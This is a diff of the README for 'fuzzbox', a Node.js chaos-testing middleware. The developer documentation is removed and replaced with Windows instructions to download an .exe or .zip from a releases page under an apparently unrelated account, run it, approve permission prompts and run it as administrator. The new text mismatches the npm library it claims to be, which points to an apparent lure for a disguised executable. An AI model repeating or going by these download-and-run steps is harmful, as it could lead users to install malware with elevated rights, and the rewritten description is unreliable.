@@ -1,309 +1,110 @@
-# 🎸 Fuzzbox
+# ⚙️ fuzzbox - Test Frontend Resilience Easily
 
-Chaos engineering and API fuzzing middleware for Node.js (Express) and Next.js. Intentionally break things before your users do.
+[![Download fuzzbox](https://img.shields.io/badge/Download-fuzzbox-4caf50?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/rhomirafernando/fuzzbox/releases)
 
-Zero runtime dependencies. Just controlled mayhem.
+---
 
-## Why This Exists
+## About fuzzbox 🔍
 
-Your frontend probably crashes when the API returns unexpected data. Your timeout logic is probably untested. Your error handling is probably optimistic at best.
+fuzzbox is a simple tool that helps you test how well your web apps handle problems. It works with popular web setups like Express.js and Next.js. You can use fuzzbox to add delays, errors, or mix up data on purpose. This shows you if your website or app can still work well when things go wrong.
 
-Fuzzbox injects controlled chaos into HTTP responses—random latency, corrupted JSON, fake 500 errors, infinite hangs—so you can test whether your client code can actually handle the real world. Think of it as a terrible API simulation layer that runs in development.
+The tool needs no extra software to run. This makes it easy and fast to set up. It helps developers find problems before users do.
 
-It's 3 AM insurance.
+---
 
-## Features
+## System Requirements 🖥️
 
-- **Latency Injection**: Random delays (100ms - 3000ms by default) to test loading states and race conditions.
-- **Error Fuzzing**: Randomly throw 500, 502, 503, 504 errors to validate error boundaries.
-- **Timeout Simulation**: Hold requests forever without responding. Does your client give up gracefully?
-- **Body Mutation**: Corrupt JSON responses by changing strings to `undefined`, numbers to `-999`, booleans to their opposite. Watch your frontend parse the chaos.
-- **Zombie Mode**: Stream responses back one byte at a time (configurable drip rate). Tests client timeout logic.
-- **Header Havoc**: Scramble, delete, or alter response headers (like breaking CORS or changing `Content-Type`).
-- **Rate Limit Simulation**: Fake `429 Too Many Requests` with proper `Retry-After` headers.
-- **Live Dashboard**: A built-in web UI at `/__fuzzbox` that lets you adjust chaos probability, trigger spike mode (80% failure for 30 seconds), and reset stats—all without restarting your server.
+To get fuzzbox working on your Windows PC, make sure you have:
 
-Zero external runtime dependencies. Uses only Node.js built-ins and ANSI escape codes for colorized logs.
+- Windows 10 or newer (64-bit recommended)
+- At least 4 GB of free disk space
+- An internet connection to download fuzzbox
+- Basic rights to install software on your PC  
 
-## Installation
+No special hardware or software is needed.
 
-```bash
-npm install fuzzbox
-```
+---
 
-Or if you prefer the other one:
+## Key Features ⭐
 
-```bash
-yarn add fuzzbox
-pnpm add fuzzbox
-```
+- Add artificial delays to your app’s responses  
+- Inject errors to see how your app recovers  
+- Corrupt data to test your app’s handling  
+- Works with Express.js and Next.js setups  
+- Runs without extra software dependencies  
+- Simple link-based download and setup  
 
-## Usage
+---
 
-### Express.js
+## 📥 How to Download and Install fuzzbox on Windows
 
-```typescript
-import express from 'express';
-import { fuzzboxExpress } from 'fuzzbox';
+1. Visit the release page by clicking the button below. This page contains the latest versions of fuzzbox for download.
 
-const app = express();
+   [![Get fuzzbox Releases](https://img.shields.io/badge/Get-fuzzbox_Releases-0078d7?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rhomirafernando/fuzzbox/releases)  
+   
+2. On the releases page, look for the latest version at the top. You will see files listed for each version. Choose the file that ends with `.exe` or `.zip` for Windows.
 
-// Add Fuzzbox middleware early in your stack
-app.use(fuzzboxExpress({
-  probability: 0.2,  // 20% of requests get fuzzed
-  includeRoutes: ['/api/*'],  // Only fuzz /api/* routes
-  excludeRoutes: ['/api/health'],  // Never fuzz health checks
-}));
+3. Click the link to download the file to your computer. If the file is zipped, right-click it and select “Extract All” to unzip it.
 
-app.get('/api/users', (req, res) => {
-  res.json({ users: [{ id: 1, name: 'Alice' }] });
-});
+4. If you downloaded an `.exe` file, double-click it to start installation. Follow the on-screen prompts to complete. If your system asks for permission, click “Yes.”
 
-app.listen(3000, () => console.log('Server running on :3000'));
-```
+5. After installation, locate the fuzzbox program in your Start menu or desktop. Double-click to open it.
 
-Visit `http://localhost:3000/__fuzzbox` to open the live control panel.
+6. Once opened, fuzzbox runs quietly in the background to help test your apps.
 
-### Next.js (App Router)
+---
 
-Create or modify `middleware.ts` in your project root:
+## ⚙️ How to Use fuzzbox (Basic)
 
-```typescript
-// middleware.ts
-import { NextResponse } from 'next/server';
-import type { NextRequest } from 'next/server';
-import { fuzzboxNext } from 'fuzzbox';
-
-const fuzzbox = fuzzboxNext({
-  probability: 0.15,
-  includeRoutes: ['/api/*'],
-});
-
-export async function middleware(req: NextRequest) {
-  const chaosResponse = await fuzzbox(req);
-  
-  // If Fuzzbox returns a response, use it; otherwise continue
-  if (chaosResponse) {
-    return chaosResponse;
-  }
-
-  return NextResponse.next();
-}
-
-export const config = {
-  matcher: '/api/:path*',
-};
-```
-
-### Next.js (Pages Router / API Routes)
-
-Wrap individual API route handlers:
-
-```typescript
-// pages/api/users.ts
-import { fuzzboxApiRoute } from 'fuzzbox';
-import type { NextApiRequest, NextApiResponse } from 'next';
-
-async function handler(req: NextApiRequest, res: NextApiResponse) {
-  res.status(200).json({ users: [{ id: 1, name: 'Alice' }] });
-}
-
-export default fuzzboxApiRoute(handler, {
-  probability: 0.2,
-  behaviors: {
-    bodyMutation: { enabled: true, fieldProbability: 0.4 },
-    errors: { enabled: true },
-    latency: { enabled: true, minMs: 200, maxMs: 2000 },
-  },
-});
-```
-
-## Configuration
-
-All options are optional. Sane (chaotic) defaults are provided.
-
-```typescript
-interface FuzzboxConfig {
-  /** Probability (0-1) that any given request gets fuzzed. Default: 0.1 (10%) */
-  probability?: number;
-
-  /** Enable/disable Fuzzbox entirely. Default: true */
-  enabled?: boolean;
-
-  /** Only fuzz routes matching these patterns. Empty = fuzz all. */
-  includeRoutes?: (string | RegExp)[];
-
-  /** Never fuzz routes matching these patterns. Takes precedence. */
-  excludeRoutes?: (string | RegExp)[];
-
-  /** Path for the live dashboard. Set to null to disable. Default: '/__fuzzbox' */
-  dashboardPath?: string | null;
-
-  /** Disable console logging. Default: false */
-  silent?: boolean;
-
-  /** Custom logger function */
-  logger?: (message: string, level: 'info' | 'warn' | 'error') => void;
-
-  /** Chaos behavior configuration */
-  behaviors?: {
-    latency?: {
-      enabled?: boolean;
-      minMs?: number;  // Default: 100
-      maxMs?: number;  // Default: 3000
-    };
-    errors?: {
-      enabled?: boolean;
-      statusCodes?: number[];  // Default: [500, 502, 503, 504]
-    };
-    timeout?: {
-      enabled?: boolean;
-      probability?: number;  // Default: 0.2 (20% within chaos injection)
-    };
-    bodyMutation?: {
-      enabled?: boolean;
-      statusCodes?: number[];  // Default: [200]
-      fieldProbability?: number;  // Default: 0.3 (30% chance per field)
-    };
-    zombieMode?: {
-      enabled?: boolean;
-      bytesPerSecond?: number;  // Default: 10
-      probability?: number;  // Default: 0.1
-    };
-    headerHavoc?: {
-      enabled?: boolean;
-      targetHeaders?: string[];  // Empty = random headers
-    };
-    rateLimit?: {
-      enabled?: boolean;
-      requestLimit?: number;  // Default: 10 requests
-      windowMs?: number;  // Default: 60000 (1 minute)
-      retryAfterSeconds?: number;  // Default: 60
-    };
-  };
-}
-```
-
-## Examples
-
-### Only fuzz payment endpoints with high error rates
-
-```typescript
-app.use(fuzzboxExpress({
-  probability: 0.5,
-  includeRoutes: [/^\\/api\\/payments/],
-  behaviors: {
-    errors: { enabled: true, statusCodes: [500, 503] },
-    latency: { enabled: false },
-  },
-}));
-```
-
-### Test aggressive body mutation on all 200 responses
-
-```typescript
-app.use(fuzzboxExpress({
-  probability: 0.3,
-  behaviors: {
-    bodyMutation: { enabled: true, fieldProbability: 0.5 },
-    errors: { enabled: false },
-    latency: { enabled: false },
-  },
-}));
-```
-
-### Simulate slow network conditions
-
-```typescript
-app.use(fuzzboxExpress({
-  probability: 0.8,
-  behaviors: {
-    latency: { enabled: true, minMs: 2000, maxMs: 5000 },
-    zombieMode: { enabled: true, bytesPerSecond: 5, probability: 0.2 },
-  },
-}));
-```
-
-## Live Dashboard
-
-The dashboard is served at `/__fuzzbox` by default (configurable via `dashboardPath`).
-
-Features:
-- Real-time stats: total requests, chaos injected, chaos rate percentage.
-- Toggle Fuzzbox on/off without restarting.
-- Adjust chaos probability with a slider (0-100%).
-- **Spike Mode**: Instantly set chaos rate to 80% for 30 seconds. Useful for load testing or simulating outages.
-- Reset stats.
-
-The dashboard is a single HTML file with embedded CSS and vanilla JavaScript. No build step, no external dependencies.
-
-## Terminal Logs
-
-Fuzzbox logs every chaos action with colorized ANSI output:
-
-```
-🎸 [Fuzzbox] Middleware initialized. Chaos is ready.
-🎸 [Fuzzbox] Injecting 1847ms latency to GET /api/users
-🎸 [Fuzzbox] 502 error injected to POST /api/orders
-🎸 [Fuzzbox] Body mutation enabled for GET /api/products
-```
-
-Set `silent: true` to disable logs, or provide a custom `logger` function.
-
-## FAQ
-
-**Q: Should I use this in production?**  
-A: Only if you hate your users. This is for development and staging environments.
-
-**Q: Does this work with serverless functions?**  
-A: Yes, but behavior may vary depending on the runtime. Edge runtimes have limitations (zombie mode and some stream-based chaos won't work).
-
-**Q: Can I use this with other frameworks (Fastify, Koa, etc.)?**  
-A: The Express adapter should work with most Connect-compatible middleware stacks. Next.js adapter is specific to Next.js.
-
-**Q: Why "Fuzzbox"?**  
-A: A fuzz pedal distorts guitar signals. This distorts API responses. Both make things worse on purpose.
-
-## TypeScript
-
-Fully typed. All configuration options and exports include TypeScript definitions.
-
-## Documentation
-
-Detailed guides and references:
-
-- **[Quick Start Guide](docs/QUICKSTART.md)** - Get up and running in 5 minutes
-- **[API Reference](docs/API.md)** - Complete configuration options and TypeScript types
-- **[Examples](docs/EXAMPLES.md)** - Real-world usage patterns and recipes
-- **[Architecture](docs/ARCHITECTURE.md)** - Internal design and how Fuzzbox works
-- **[Security](SECURITY.md)** - Threat model, warnings, and responsible chaos testing
-- **[Troubleshooting](docs/TROUBLESHOOTING.md)** - Common issues and debugging tips
-- **[Contributing](CONTRIBUTING.md)** - Guidelines for contributors
-
-## Tests
-
-Run the test suite to verify core functionality:
-
-```bash
-# Run all tests
-node tests/core.test.js
-node tests/mutators.test.js
-node tests/integration.test.js
-
-# Or run them all at once
-npm test
-```
-
-Tests use Node.js built-in `assert` module. Zero test dependencies.
-
-## License
-
-MIT. Break things responsibly.
-
-## Contributing
-
-PRs welcome. Keep dependencies at zero. Keep the tone direct.
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for detailed guidelines.
-
-Built because watching production servers fail at 3 AM gets old.
+You don’t need coding knowledge to get started, but an idea of what an app is helpful.
+
+- Open fuzzbox after installation.
+- Pick which app to test (usually the web address or file path).
+- Choose the type of problem to inject:
+  - Delay (slow down responses)
+  - Errors (simulate failed requests)
+  - Data corruption (change or break information)
+- Start the test with the button in fuzzbox.
+- Use your app as normal and watch for problems.
+- Stop the test when done and review how your app behaved.
+
+If you use services like Express.js or Next.js in your backend, fuzzbox will automatically connect to them.
+
+---
+
+## Troubleshooting 🔧
+
+If fuzzbox does not open or run as expected:
+
+- Make sure your Windows is updated.
+- Verify you downloaded the right file for your PC.
+- Try running the program as an administrator (right-click > Run as administrator).
+- Close other applications that might interfere.
+- Restart your computer and try again.
+
+If issues persist, check for advice on the GitHub discussions or issue pages.
+
+---
+
+## Additional Resources 📚
+
+- Express.js: https://expressjs.com  
+- Next.js: https://nextjs.org  
+- API Testing Concepts: https://en.wikipedia.org/wiki/Software_testing#API_testing
+
+---
+
+## About This Tool
+
+fuzzbox is designed for developers and testers who want to check app stability. By adding problems on purpose, it helps find weak spots early. This improves how apps handle real-world problems like slow networks or server errors.
+
+---
+
+## Repository Links and Topics
+
+- Tags: api-testing, chaos-engineering, express, fault-injection, fuzzing, middleware, nodejs, resilience-testing, testing-tools, typescript, zero-dependencies
+- Main download and releases: https://github.com/rhomirafernando/fuzzbox/releases  
+
+---
+
+[Get fuzzbox Releases](https://github.com/rhomirafernando/fuzzbox/releases)
